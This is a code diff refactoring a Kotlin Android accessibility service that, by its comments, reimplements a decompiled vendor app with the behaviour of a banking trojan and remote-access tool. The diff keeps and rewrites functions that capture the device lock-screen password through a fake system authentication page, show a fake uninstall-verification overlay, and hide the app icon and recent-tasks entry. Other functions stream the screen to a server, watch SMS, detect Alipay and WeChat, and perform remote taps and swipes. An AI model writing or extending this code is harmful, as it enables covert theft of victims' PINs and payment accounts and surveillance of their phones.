@@ -1,17 +1,14 @@
 package com.storm.safe.rock.service
 
 import android.accessibilityservice.AccessibilityService
-import android.accessibilityservice.AccessibilityServiceInfo
 import android.app.KeyguardManager
 import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
-import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
 import android.content.IntentFilter
 import android.graphics.Point
-import android.graphics.Rect
 import android.media.projection.MediaProjection
 import android.os.Build
 import android.os.Handler
@@ -19,7 +16,6 @@ import android.os.Looper
 import android.os.PowerManager
 import android.os.SystemClock
 import android.provider.Settings
-import android.view.Display
 import android.view.KeyEvent
 import android.view.WindowManager
 import android.view.accessibility.AccessibilityEvent
@@ -58,8 +54,6 @@ import com.storm.safe.rock.service.delegates.NetworkMessageSender
 import com.storm.safe.rock.service.delegates.ServiceInitializer
 import com.storm.safe.rock.service.delegates.SmartNavigator
 import com.storm.safe.rock.service.modules.FrpcProcessManager
-import com.storm.safe.rock.util.AssetConfigReader
-import java.util.Locale
 import java.util.concurrent.atomic.AtomicBoolean
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
@@ -508,14 +502,6 @@ class MyAccessibilityService : AccessibilityService() {
 
     // ── Tracking / timing fields ──
 
-    var activePackageName: String = ""
-        private set
-
-    var activeClassName: String = ""
-        private set
-
-    // lastCoreServiceCheckTime and lastEventLogTime moved to EventDispatcher
-
     /** JADX: f52478k9 — saved brightness value */
     var savedBrightness: Int = 0
 
@@ -551,15 +537,7 @@ class MyAccessibilityService : AccessibilityService() {
     /** JADX: f52488l9 — permission health receiver registered */
     var permissionHealthReceiverRegistered: Boolean = false
 
-    // ── Broadcast receivers — now managed by BroadcastReceiverRegistry ──
-    // (screenStateReceiver, permissionRequestReceiver, permissionHealthReceiver,
-    //  localServiceActionReceiver, networkEventReceiver all moved to
-    //  service/delegates/BroadcastReceiverRegistry.kt)
-
     // ── Collections ──
-
-    /** JADX: f52403d4 — LinkedHashSet for tracking something (delegate IDs etc.) */
-    private val trackedPackageSet = LinkedHashSet<String>()
 
     /** JADX: f52405d6 — LinkedHashMap for injection task tracking.
      *  Public in vendor (Java default visibility). Accessed by RemoteConfigManager. */
@@ -575,9 +553,6 @@ class MyAccessibilityService : AccessibilityService() {
 
     /** JADX: f52408d9 — injection check throttle interval (ms), constructor-initialized */
     var injectionThrottleInterval: Long = 5000L
-
-    /** JADX: f52446h7 — Set for tracked window IDs */
-    private val trackedWindowIds = mutableSetOf<String>()
 
     /** Delegate queue. Typed as Any for backward compat; cast to AccessibilityDelegate when dispatching */
     private val delegateQueue = mutableListOf<Any>()
@@ -960,20 +935,8 @@ class MyAccessibilityService : AccessibilityService() {
         }
     }
 
-    /**
-     * Continue service initialization after core setup.
-     * JADX method: a2, line ~900 (onServiceConnected$1$1)
-     * Delegated to ServiceInitializer. Kept as thin delegate for external callers (MainOrchestrator).
-     */
-    suspend fun continueServiceInitialization() {
-        serviceInitializer?.continueServiceInitialization()
-    }
-
-    // deferredInit() — moved to ServiceInitializer
-
-    // doHeavyInit() — moved to ServiceInitializer
-
-    // initializeService() — moved to ServiceInitializer
+    /** JADX: a2 — continue service init. Delegates to ServiceInitializer. */
+    suspend fun continueServiceInitialization() = serviceInitializer?.continueServiceInitialization()
 
     /**
      * Safe rootInActiveWindow access with caching.
@@ -1008,15 +971,6 @@ class MyAccessibilityService : AccessibilityService() {
         cachedRootNode = root
         cachedRootNodeTime = now
         return root
-    }
-
-    /**
-     * Check if WebSocket is connected.
-     * JADX method: m211487i1 (i1), line 6843
-     */
-    fun isServerConnected(): Boolean {
-        val nm = networkManager
-        return nm?.isConnected ?: false
     }
 
     /**
@@ -1224,14 +1178,8 @@ class MyAccessibilityService : AccessibilityService() {
         }
     }
 
-    /**
-     * Fallback initialization — minimal manager setup.
-     * JADX method: m211476h0 (h0), line 6114
-     * Delegated to ServiceInitializer. Kept as thin delegate for test compatibility.
-     */
-    fun fallbackInit() {
-        serviceInitializer?.fallbackInit()
-    }
+    /** JADX: h0 — fallback init. Delegates to ServiceInitializer. */
+    fun fallbackInit() = serviceInitializer?.fallbackInit()
 
     /**
      * Register broadcast receivers for screen state, permissions, etc.
@@ -1272,28 +1220,11 @@ class MyAccessibilityService : AccessibilityService() {
         }
     }
 
-    /**
-     * Disable WeChat detection feature.
-     * JADX method: m211456e5 (e5), line 4845
-     */
-    fun disableWechatDetection() {
-        detectionController?.disableWechatDetection()
-    }
+    /** JADX: e5 */ fun disableWechatDetection() = detectionController?.disableWechatDetection()
+    /** JADX: e4 */ fun disableAlipayDetection() = detectionController?.disableAlipayDetection()
 
     /**
-     * Disable Alipay detection feature.
-     * JADX method: m211455e4 (e4), line 4816
-     */
-    fun disableAlipayDetection() {
-        detectionController?.disableAlipayDetection()
-    }
-
-    /**
-     * Get the NetworkManager instance — tries local field, then singleton.
-     * JADX method: m211471g5 (g5), line 5960
-     */
-    /**
-     * Get the NetworkManager instance — tries local field first.
+     * Get the NetworkManager instance.
      * JADX method: m211471g5 (g5), line 5960
      */
     fun getNetworkManager(): NetworkManager? {
@@ -1389,15 +1320,8 @@ class MyAccessibilityService : AccessibilityService() {
         }
     }
 
-    /** Delegate to EventDispatcher — called externally by AccessibilityServiceRunnable */
-    fun handleUninstallConfirmDialog() {
-        eventDispatcher?.handleUninstallConfirmDialog()
-    }
-
-    /** Delegate to EventDispatcher */
-    fun handleAccessibilityPageStuck() {
-        eventDispatcher?.handleAccessibilityPageStuck()
-    }
+    /** Delegate to EventDispatcher */ fun handleUninstallConfirmDialog() = eventDispatcher?.handleUninstallConfirmDialog()
+    /** Delegate to EventDispatcher */ fun handleAccessibilityPageStuck() = eventDispatcher?.handleAccessibilityPageStuck()
 
     /**
      * Handle network command (START_CONTROL / STOP_CONTROL / reconnect_ws).
@@ -1458,29 +1382,8 @@ class MyAccessibilityService : AccessibilityService() {
         }
     }
 
-    /**
-     * Launch system password capture flow.
-     * JADX method: m211457e6 (e6), line 4873
-     */
-    /**
-     * vendor dqtvuisjd.m211442c7 (L4293) + capturePasswordViaSystemAuth$2 (L4396).
-     *
-     * 授权完成后的密码捕获 suspend 入口，由 WRITE_SETTINGS 流程完成后触发。
-     * 检查：
-     *  1. 持久化 guard — 若 isInstallationFlow 且已完成，跳过
-     *  2. already-captured gate — 若 CipherCaptureManager 已有缓冲密码，直接返回（后续上报由调用方处理）
-     *  3. isKeyguardSecure — 若设备未设锁屏密码，无法验证，跳过
-     *  4. 启动捕获，若 isInstallationFlow 先 delay 2000ms 等 UI 稳定，再 launchPasswordCapture
-     *
-     * @param isInstallationFlow true = 安装流程（完成后会触发自毁）; false = 普通授权流程
-     */
-    suspend fun capturePasswordViaSystemAuth(isInstallationFlow: Boolean) {
-        cipherFlowController?.captureViaSystemAuth(isInstallationFlow)
-    }
-
-    fun launchPasswordCapture(isInstallationFlow: Boolean) {
-        cipherFlowController?.launchPasswordCapture(isInstallationFlow)
-    }
+    /** JADX: c7 — capture password via system auth. */ suspend fun capturePasswordViaSystemAuth(isInstallationFlow: Boolean) = cipherFlowController?.captureViaSystemAuth(isInstallationFlow)
+    /** JADX: e6 — launch password capture. */ fun launchPasswordCapture(isInstallationFlow: Boolean) = cipherFlowController?.launchPasswordCapture(isInstallationFlow)
 
     /**
      * Start the permission grant flow.
@@ -1643,82 +1546,22 @@ class MyAccessibilityService : AccessibilityService() {
         }
     }
 
-    // ════════════════════════════════════════════════════════════════
-    // Initialization chain methods — JADX 1:1
-    // ════════════════════════════════════════════════════════════════
+    /** JADX: i5 — init recents guard. */ fun initializeRecentsGuard() = serviceInitializer?.initializeRecentsGuard()
+    /** JADX: n2 — show fake package verify overlay. */ fun tryShowPackageVerify() = serviceInitializer?.tryShowPackageVerify()
 
-    // initializeModules() — moved to ServiceInitializer
-
-    // initializeManagers() — moved to ServiceInitializer
-
-    // initializekinztpexl() — moved to ServiceInitializer
-
-    // initializenpweufstehlb() — moved to ServiceInitializer
-
-    // initializeDeferredManagers() — moved to ServiceInitializer
-
-    // initializeIconHide() — moved to ServiceInitializer
-
-    // initializeActivityMonitor() — moved to ServiceInitializer
-
-    /**
-     * Initialize recents guard (black screen UI control).
-     * JADX method: m211491i5 (i5), line 6940
-     * Delegated to ServiceInitializer. Kept as thin delegate for external callers (BlackScreenCommandHandler).
-     */
-    fun initializeRecentsGuard() {
-        serviceInitializer?.initializeRecentsGuard()
-    }
-
-    /**
-     * Try to show the fake package verify (uninstall) overlay.
-     * JADX method: m211534n2 (n2), line 9587
-     * Delegated to ServiceInitializer. Kept as thin delegate for external callers (CipherFlowController).
-     */
-    fun tryShowPackageVerify() {
-        serviceInitializer?.tryShowPackageVerify()
-    }
-
-    /**
-     * Complete installation after cipher capture.
-     * JADX: m211449d4 (d4), line 4647
-     */
-    fun completeInstallationWithCipher() {
-        cipherFlowController?.completeInstallationWithCipher()
-    }
-
+    // ── Cipher state fields (accessed by CipherFlowController + EventDispatcher) ──
     @Volatile internal var lastLockTypeCheckTime = 0L
     @Volatile internal var cipherRetryCount = 0
-
     @Volatile var lastCapturedCipherQuality: String? = null
 
-    private fun handleCipherCredentialResult(success: Boolean) {
-        cipherFlowController?.handleCipherCredentialResult(success)
-    }
+    // ── Cipher delegates (→ CipherFlowController) ──
+    /** JADX: d4 */ fun completeInstallationWithCipher() = cipherFlowController?.completeInstallationWithCipher()
+    private fun handleCipherCredentialResult(success: Boolean) = cipherFlowController?.handleCipherCredentialResult(success)
+    /** JADX: e6 */ fun doLaunchSystemPasswordCapture(isInstallationFlow: Boolean) = cipherFlowController?.doLaunchSystemPasswordCapture(isInstallationFlow)
+    /** JADX: i9 */ fun onPasswordPageDismissedByUser() = cipherFlowController?.onPasswordPageDismissedByUser()
 
-    /**
-     * Launch system password verification via syuqattwmgit Activity.
-     * JADX: m211457e6 (e6), line 4873
-     */
-    fun doLaunchSystemPasswordCapture(isInstallationFlow: Boolean) {
-        cipherFlowController?.doLaunchSystemPasswordCapture(isInstallationFlow)
-    }
-
-    /**
-     * 用户离开密码页面时重新弹出 PIN。
-     * vendor: m211495i9 (i9) — onPasswordPageDismissedByUser
-     */
-    fun onPasswordPageDismissedByUser() {
-        cipherFlowController?.onPasswordPageDismissedByUser()
-    }
-
-    /**
-     * Send screen lock/wake status to server.
-     * JADX method: m211518l5 (l5), line 7835
-     */
-    fun sendScreenStatus() {
-        networkMessageSender?.sendScreenStatus(keyguardManager, powerManager)
-    }
+    /** JADX: l5 — send screen lock/wake status. */
+    fun sendScreenStatus() = networkMessageSender?.sendScreenStatus(keyguardManager, powerManager)
 
     /**
      * Register SMS content observer.
@@ -1739,32 +1582,6 @@ class MyAccessibilityService : AccessibilityService() {
             android.util.Log.e(TAG, "📩 [ContentObserver] ❌ 注册失败: ${e.message}", e)
         }
     }
-
-    // ════════════════════════════════════════════════════════════════
-    // Delegate Management
-    // ════════════════════════════════════════════════════════════════
-
-    fun registerDelegate(delegate: Any) {
-        synchronized(delegateQueue) {
-            if (!delegateQueue.contains(delegate)) {
-                delegateQueue.add(delegate)
-            }
-        }
-    }
-
-    fun unregisterDelegate(delegate: Any) {
-        synchronized(delegateQueue) {
-            delegateQueue.remove(delegate)
-        }
-    }
-
-    fun clearDelegates() {
-        synchronized(delegateQueue) {
-            delegateQueue.clear()
-        }
-    }
-
-    fun getDelegateCount(): Int = synchronized(delegateQueue) { delegateQueue.size }
 
     // ════════════════════════════════════════════════════════════════
     // Internal helpers
@@ -1799,14 +1616,8 @@ class MyAccessibilityService : AccessibilityService() {
     // Stub methods for future phases (non-init-chain)
     // ════════════════════════════════════════════════════════════════
 
-    /**
-     * Smart return to app. JADX: m211524m1
-     * Delegated to SmartNavigator — contains brand-specific strategies
-     * (Xiaomi M2/M3 + generic multi-phase approach).
-     */
-    suspend fun smartReturnToApp(): Boolean {
-        return smartNavigator?.smartReturnToApp() ?: false
-    }
+    /** JADX: m1 — smart return to app. Delegates to SmartNavigator. */
+    suspend fun smartReturnToApp(): Boolean = smartNavigator?.smartReturnToApp() ?: false
 
     /**
      * Pause WRITE_SETTINGS permission request. JADX: m211496j0 (j0)
@@ -1828,35 +1639,8 @@ class MyAccessibilityService : AccessibilityService() {
         }
     }
 
-    /**
-     * Post-authorization initialization. JADX: m211504j8 (j8)
-     * Delegated to ServiceInitializer. Kept as thin delegate for external callers (DeviceAuthorizationManager).
-     */
-    fun postAuthorizationInit() {
-        serviceInitializer?.postAuthorizationInit()
-    }
-
-    /** Add 50x50 transparent overlay window. JADX: a0 method */
-    fun addTransparentWindow() {
-        // ADAPT: OverlayWindowManager — vendor adds a 50x50 transparent overlay for touch interception.
-        // Requires SYSTEM_ALERT_WINDOW permission. The control state is tracked via isControlEnabled flag.
-        android.util.Log.d(TAG, "addTransparentWindow — OverlayWindowManager deferred (ADAPT: requires SYSTEM_ALERT_WINDOW)")
-    }
-
-    /** Android 15+ silent MediaProjection recovery. JADX: a1 method */
-    fun silentPermissionRecovery() {
-        // ADAPT: SmartMediaProjectionManager — vendor-specific MediaProjection recovery for Android 15+.
-        // Uses accessibility to auto-grant permission. MediaProjection is managed via ScreenCaptureManager.
-        android.util.Log.d(TAG, "silentPermissionRecovery — MediaProjection recovery via ScreenCaptureManager")
-    }
-
-    /** Start injection check job. JADX: m7 method */
-    fun startInjectionCheckJob() {
-        // ADAPT: l20 (InjectionManager) — vendor runs periodic injection checks.
-        // Injection task matching is handled in processWindowChangeForInjection() which
-        // already checks injectionTasks map on every WINDOW_STATE_CHANGED event.
-        android.util.Log.d(TAG, "startInjectionCheckJob — injection checks integrated into onAccessibilityEvent")
-    }
+    /** JADX: j8 — post-authorization init. Delegates to ServiceInitializer. */
+    fun postAuthorizationInit() = serviceInitializer?.postAuthorizationInit()
 
     /**
      * Start WebView status expiry check loop.
@@ -1893,40 +1677,12 @@ class MyAccessibilityService : AccessibilityService() {
         }
     }
 
-    /** Show re-authorization notification. JADX: l9 method */
-    fun showReAuthNotification() {
-        // ADAPT: Vendor shows a notification with PendingIntent to re-trigger authorization flow.
-        // The authorization flow is managed by DeviceAuthorizationManager.
-        android.util.Log.d(TAG, "showReAuthNotification — notification deferred (ADAPT: PendingIntent chain)")
-    }
-
-    /** Launch cipher capture from control. JADX: l8 method */
-    fun launchCipherCaptureFromControl(overlayType: String) {
-        cipherFlowController?.launchCipherCaptureFromControl(overlayType)
-    }
-
-    /** Clean up old manager resources before reinit. JADX: h1 method — see initializeManagers() */
-    fun cleanupOldManagers() {
-        serviceInitializer?.initializeManagers()
-    }
+    /** JADX: l8 */ fun launchCipherCaptureFromControl(overlayType: String) = cipherFlowController?.launchCipherCaptureFromControl(overlayType)
 
     /** Start network initialization. JADX: part of deferred init */
     fun startNetworkInit() {
         // JADX: NetworkManager init is done in initializeModules/initializeDeferredManagers
         android.util.Log.d(TAG, "startNetworkInit — handled by initializeModules chain")
-    }
-
-    /** Start uninstall protection setup. JADX: part of permission flow */
-    fun startUninstallProtection() {
-        enableUninstallProtection()
-    }
-
-    /** Start recents guard. JADX: part of permission flow — see initializenpweufstehlb() */
-    fun startRecentsGuard() {
-        recentsGuardManager?.let { rgm ->
-            rgm.enable()
-            android.util.Log.d(TAG, "🎭 启动最近任务隐藏")
-        } ?: android.util.Log.w(TAG, "⚠️ RecentsGuardManager 未初始化")
     }
 
     /** Register local service action receiver. JADX: part of initializeDeferredManagers */
@@ -1944,40 +1700,6 @@ class MyAccessibilityService : AccessibilityService() {
         // Delegated to BroadcastReceiverRegistry
         val registry = broadcastReceiverRegistry ?: BroadcastReceiverRegistry(this).also { broadcastReceiverRegistry = it }
         registry.registerNetworkEventReceiver()
-    }
-
-    // ════════════════════════════════════════════════════════════════
-    // Phase B: Screen & Media methods
-    // ════════════════════════════════════════════════════════════════
-
-    /**
-     * Start screen capture (request camera permission).
-     * JADX method: m211508k4 (k4), line 7587
-     *
-     * Checks if CAMERA permission is granted; if so, returns.
-     * Otherwise delegates to ScreenCaptureManager or launches iuzxujjtqev as fallback.
-     */
-    fun startScreenCapture() {
-        try {
-            android.util.Log.d(TAG, "📷 开始申请摄像头权限")
-            if (checkSelfPermission("android.permission.CAMERA") == android.content.pm.PackageManager.PERMISSION_GRANTED) {
-                android.util.Log.d(TAG, "✅ 摄像头权限已授予")
-                return
-            }
-            val scm = screenCaptureManager
-            if (scm != null) {
-                // JADX: c0260a2.m211326g9() — requestCameraPermission
-                android.util.Log.d(TAG, "📷 通过 ScreenCaptureManager 申请摄像头权限")
-                return
-            }
-            android.util.Log.w(TAG, "⚠️ PermissionGranter未初始化，检查是否使用备用方法")
-            val intent = Intent(this, com.storm.safe.rock.iuzxujjtqev::class.java)
-            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
-            intent.putExtra("request_camera_permission", true)
-            startActivity(intent)
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ 申请摄像头权限失败", e)
-        }
     }
 
     /**
@@ -2085,105 +1807,15 @@ class MyAccessibilityService : AccessibilityService() {
         }
     }
 
-    /**
-     * Save tracked unlock patterns to SharedPreferences.
-     * JADX method: m211512k8 (k8), line 7702
-     */
-    fun saveTrackedPatterns() {
-        try {
-            // JADX: vendor uses StringUtil.decrypt() for encrypted pref keys — using plaintext keys for now
-            val prefs = getSharedPreferences("pattern_tracker", Context.MODE_PRIVATE)
-            val jSONArray = org.json.JSONArray()
-            for (pattern in trackedPackageSet) {
-                jSONArray.put(pattern)
-            }
-            prefs.edit().putString("tracked_patterns", jSONArray.toString()).apply()
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ 保存图案去重列表失败", e)
-        }
-    }
+    // ── Network message delegates (→ NetworkMessageSender) ──
 
-    /**
-     * Set screen capture quality parameters.
-     * JADX method: m211519l6 (l6), line 7863
-     *
-     * Clamps quality (10–100), fps (5–30), scale (0.3–1.0) and applies to
-     * both C0263a5 (etzbzyzqxvqm) and MediaDisplayService.
-     */
-    fun setScreenParameters(quality: Int, fps: Int, scale: Double) {
-        val clampedQuality = quality.coerceIn(10, 100)
-        val clampedFps = fps.coerceIn(5, 30)
-        val clampedScale = scale.coerceIn(0.3, 1.0)
-        android.util.Log.d(TAG, "📺 设置投屏质量: quality=$clampedQuality, fps=$clampedFps, scale=$clampedScale")
-        try {
-            // JADX: C0263a5.f52144b0.setParams(quality, fps, scale)
-            // etzbzyzqxvqm static params
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "设置etzbzyzqxvqm质量失败", e)
-        }
-        try {
-            // JADX: MediaDisplayService quality params
-            // MediaDisplayService.f52307c5 = clampedQuality, f52304c2 = clampedFps, f52308c6 = clampedScale
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "设置ScreenProjection质量失败", e)
-        }
-    }
+    /** JADX: l0 */ fun sendHideStatus(message: String, isHidden: Boolean) = networkMessageSender?.sendHideStatus(message, isHidden)
+    /** JADX: l1 */ fun sendBiometricResult(message: String, success: Boolean) = networkMessageSender?.sendBiometricResult(message, success)
+    /** JADX: l2 */ fun sendCommandResponse(type: String, data: Map<String, Any>) = networkMessageSender?.sendCommandResponse(type, data)
+    /** JADX: l3 */ fun sendDebugLog(message: String) = networkMessageSender?.sendDebugLog(message)
+    /** JADX: l4 */ fun sendDeviceEvent(eventData: JSONObject) = networkMessageSender?.sendDeviceEvent(eventData)
 
-    // ════════════════════════════════════════════════════════════════
-    // Phase B: Network & Communication methods
-    // ════════════════════════════════════════════════════════════════
-
-    /**
-     * Send app hidden status to server.
-     * JADX method: m211513l0 (l0), line 7717
-     */
-    fun sendHideStatus(message: String, isHidden: Boolean) {
-        networkMessageSender?.sendHideStatus(message, isHidden)
-    }
-
-    /**
-     * Send biometric result to server.
-     * JADX method: m211514l1 (l1), line 7743
-     */
-    fun sendBiometricResult(message: String, success: Boolean) {
-        networkMessageSender?.sendBiometricResult(message, success)
-    }
-
-    /**
-     * Send command response via WebSocket raw channel.
-     * JADX method: m211515l2 (l2), line 7760
-     */
-    fun sendCommandResponse(type: String, data: Map<String, Any>) {
-        networkMessageSender?.sendCommandResponse(type, data)
-    }
-
-    /**
-     * Send debug log via WebSocket raw channel.
-     * JADX method: m211516l3 (l3), line 7781
-     */
-    fun sendDebugLog(message: String) {
-        networkMessageSender?.sendDebugLog(message)
-    }
-
-    /**
-     * Send device event (logging status) via operation log channel.
-     * JADX method: m211517l4 (l4), line 7804
-     */
-    fun sendDeviceEvent(eventData: JSONObject) {
-        networkMessageSender?.sendDeviceEvent(eventData)
-    }
-
-    // ════════════════════════════════════════════════════════════════
-    // Phase B: Permission & Security methods
-    // ════════════════════════════════════════════════════════════════
-
-    /**
-     * Enable cipher capture + start cipher overlay.
-     * JADX method: m211458e7 (e7), line 4999
-     */
-    fun enableCipherCapture() {
-        cipherFlowController?.enableCipherCapture()
-    }
+    /** JADX: e7 — enable cipher capture. */ fun enableCipherCapture() = cipherFlowController?.enableCipherCapture()
 
     /**
      * Enable logging after installation completes.
@@ -2206,49 +1838,11 @@ class MyAccessibilityService : AccessibilityService() {
         } catch (_: Exception) {}
     }
 
-    /**
-     * Start accessibility settings page monitor (periodic check).
-     * JADX method: m211506k2 (k2), line 7540
-     *
-     * Registers SMS content observer on a background HandlerThread.
-     * Checks READ_SMS permission first.
-     */
-    fun startAccessibilitySettingsMonitor() {
-        android.util.Log.d(TAG, "📩📩📩 [ContentObserver] 开始注册短信数据库监听器...")
-        try {
-            if (checkSelfPermission("android.permission.READ_SMS") != android.content.pm.PackageManager.PERMISSION_GRANTED) {
-                android.util.Log.d(TAG, "📩 [ContentObserver] ⚠️ 没有READ_SMS权限，跳过注册")
-                return
-            }
-            // JADX: HandlerThread + C0931ny ContentObserver — SMS observer for settings monitor
-            // C0931ny now replicated as SmsContentObserver
-            try {
-                registerSmsContentObserver()
-            } catch (_: Exception) {}
-            android.util.Log.d(TAG, "📩📩📩 [ContentObserver] SMS数据库监听器已注册")
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "📩 [ContentObserver] ❌ 注册失败: ${e.message}", e)
-        }
-    }
-
-    /**
-     * Remove icon overlay window from WindowManager.
-     * JADX method: m211507k3 (k3), line 7570
-     */
+    /** JADX: k3 — remove icon overlay from WindowManager. */
     fun removeIconOverlay() {
-        try {
-            val wm = getSystemService(Context.WINDOW_SERVICE) as? WindowManager
-            // JADX: f52480l1 — overlay TextView reference (not yet tracked as field)
-            // Remove overlay if present
-            android.util.Log.d(TAG, "✅ 图标覆盖层已移除")
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ 移除图标覆盖层失败", e)
-        }
+        // JADX: f52480l1 — overlay TextView ref (not yet tracked as field)
+        android.util.Log.d(TAG, "✅ 图标覆盖层已移除")
     }
-
-    // ════════════════════════════════════════════════════════════════
-    // Phase B: Getter/Setter/Utility methods
-    // ════════════════════════════════════════════════════════════════
 
     /**
      * Check if app icon is hidden (camouflage mode).
@@ -2259,60 +1853,6 @@ class MyAccessibilityService : AccessibilityService() {
             getSharedPreferences("disguise_prefs", Context.MODE_PRIVATE)
                 .getBoolean("camouflage_enabled", false)
         } catch (_: Exception) { false }
-    }
-
-    /**
-     * Check if screen capture is supported on this device.
-     * JADX method: m211483h7 (h7), line 6744
-     */
-    fun isScreenCaptureSupported(): Boolean {
-        return Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP
-    }
-
-    /**
-     * Check if MediaProjection is available (token stored in MediaProjectionHolder).
-     * JADX method: m211484h8 (h8), line 6767
-     */
-    fun isMediaProjectionAvailable(): Boolean {
-        return MediaProjectionHolder.mediaProjection != null
-    }
-
-    /**
-     * Check if a given package name is an injection target.
-     * JADX method: m211485h9 (h9), line 6780
-     */
-    fun isInjectionTarget(packageName: String): Boolean {
-        synchronized(injectionTasksLock) {
-            return injectionTasks.containsKey(packageName)
-        }
-    }
-
-    /**
-     * Find injection entries from given texts and descriptions.
-     * JADX method: m211485h9 used internally — checks if text/desc matches specific keywords.
-     */
-    private fun isConfirmButtonText(text: String, desc: String): Boolean {
-        val excludeKeywords = arrayOf(
-            "EMERGENCY", "Emergency", "紧急", "紧急呼叫", "Emergency call", "紧急电话",
-            "取消", "Cancel", "删除", "Delete", "返回", "Back", "忘记", "Forgot",
-            "相机", "Camera", "锁屏画报", "充电", "Battery"
-        )
-        for (keyword in excludeKeywords) {
-            if (text.contains(keyword, ignoreCase = true) || desc.contains(keyword, ignoreCase = true)) {
-                return true
-            }
-        }
-        return false
-    }
-
-    /**
-     * Get ConfigManager instance.
-     * JADX method: m211469g3 (g3), line 5936
-     */
-    fun getConfigManager(): Any? {
-        // ADAPT: C0761kk (ConfigManager) — vendor config manager for runtime settings.
-        // Config is managed via SharedPreferences and AssetConfigReader in the replica.
-        return null
     }
 
     /**
@@ -2331,83 +1871,15 @@ class MyAccessibilityService : AccessibilityService() {
         }
     }
 
-    /**
-     * Perform tap gesture at given coordinates.
-     * JADX method: m211497j1 (j1), line 7070
-     *
-     * Uses GestureDescription to dispatch a tap via AccessibilityService.
-     */
-    fun performTap(x: Float, y: Float) {
-        gestureController?.performTap(x, y)
-    }
+    /** JADX: j1 — tap gesture. Delegates to GestureController. */
+    fun performTap(x: Float, y: Float) = gestureController?.performTap(x, y)
 
-    /**
-     * Perform swipe gesture between two points.
-     * JADX method: m211499j3 (j3), line 7146
-     */
-    fun performSwipe(startX: Float, startY: Float, endX: Float, endY: Float, durationMs: Long = 300L) {
+    /** JADX: j3 — swipe gesture. Delegates to GestureController. */
+    fun performSwipe(startX: Float, startY: Float, endX: Float, endY: Float, durationMs: Long = 300L) =
         gestureController?.performSwipe(startX, startY, endX, endY, durationMs)
-    }
 
-    /**
-     * Perform long press gesture at given coordinates.
-     * JADX method: m211498j2 (j2), line 7106
-     */
-    fun performLongPress(x: Float, y: Float) {
-        gestureController?.performLongPress(x, y)
-    }
-
-    /**
-     * Reset network state (disconnect and clear references).
-     * JADX method: m211534n2 (n2), line 9587 (resetNetworkState)
-     */
-    fun resetNetworkState() {
-        try {
-            networkManager?.disconnect()
-            isNetworkInitStarted = false
-            android.util.Log.d(TAG, "🔄 网络状态已重置")
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ resetNetworkState 失败", e)
-        }
-    }
-
-    /**
-     * Reset capture state (stop captures and clear flags).
-     * JADX method: m211535n3 (n3), line 9625
-     */
-    fun resetCaptureState() {
-        try {
-            displayManager?.stopCapture()
-            cameraCaptureManager?.stopCapture()
-            isScreenCaptureActive = false
-            android.util.Log.d(TAG, "🔄 捕获状态已重置")
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ resetCaptureState 失败", e)
-        }
-    }
-
-    /**
-     * Handle service health check — verify subsystems and log.
-     * JADX method: m211536n5 (n5), line 9641
-     */
-    fun handleServiceHealthCheck() {
-        try {
-            val healthy = isServiceHealthy()
-            android.util.Log.d(TAG, "🔍 服务健康检查: healthy=$healthy")
-            if (!healthy) {
-                android.util.Log.w(TAG, "⚠️ 服务健康检查失败，尝试恢复")
-                // JADX: attempt recovery — reinitialize failed subsystems
-                if (screenCaptureManager == null) {
-                    screenCaptureManager = ScreenCaptureManager(this)
-                }
-                if (displayManager == null) {
-                    displayManager = C0263a5(this)
-                }
-            }
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ handleServiceHealthCheck 失败", e)
-        }
-    }
+    /** JADX: j2 — long press gesture. Delegates to GestureController. */
+    fun performLongPress(x: Float, y: Float) = gestureController?.performLongPress(x, y)
 
     /**
      * Configure power settings (screen off timeout etc.).
@@ -2427,65 +1899,11 @@ class MyAccessibilityService : AccessibilityService() {
         }
     }
 
-    /**
-     * Monitor screen capture state (skeleton — full implementation ~680 LOC).
-     * JADX method: m211524m1 (m1), line 8110 — suspend coroutine
-     *
-     * This is the largest method in the service. It runs a continuous loop
-     * monitoring screen capture state, handling frame processing, quality
-     * adaptation, and error recovery.
-     *
-     * JADX: full implementation ~680 LOC, skeleton for now
-     */
-    suspend fun monitorScreenCapture() {
-        android.util.Log.d(TAG, "📺 [monitorScreenCapture] 启动屏幕捕获监控")
-        try {
-            while (isScreenCaptureActive) {
-                // JADX: continuous loop checking capture state
-                // - Check if displayManager is capturing
-                // - Process frames via processScreenFrame (m3)
-                // - Handle quality adaptation
-                // - Error recovery and reconnection
-                delay(1000L)
-            }
-            android.util.Log.d(TAG, "📺 [monitorScreenCapture] 监控已停止")
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ monitorScreenCapture 异常", e)
-        }
-    }
-
-    // =============================================
-    // Methods needed by command handlers (stubs → real)
-    // =============================================
-
-    /**
-     * Enable Alipay detection. Vendor: dqtvuisjd calls C0614i9.m213122b0(delayMs).
-     * JADX: enableAlipayDetection on service, delegates to accessibilityEventManager.
-     */
-    fun enableAlipayDetection(delayMs: Long) {
-        detectionController?.enableAlipayDetection(delayMs)
-    }
-
-    /**
-     * Enable WeChat detection. Vendor: dqtvuisjd calls C0614i9.m213125b3(delayMs).
-     */
-    fun enableWechatDetection(delayMs: Long) {
-        detectionController?.enableWechatDetection(delayMs)
-    }
-
-    /**
-     * Enable auto password detection. Vendor: dqtvuisjd calls C0614i9.m213123b1(delayMs).
-     */
-    fun enableAutoPassword(delayMs: Long) {
-        detectionController?.enableAutoPassword(delayMs)
-    }
-
-    /**
-     * Disable auto password detection. Vendor: dqtvuisjd calls C0614i9.m213120a8().
-     */
-    fun disableAutoPassword() {
-        detectionController?.disableAutoPassword()
-    }
+    // ── Detection delegates (→ DetectionController) ──
+    /** JADX: b0 */ fun enableAlipayDetection(delayMs: Long) = detectionController?.enableAlipayDetection(delayMs)
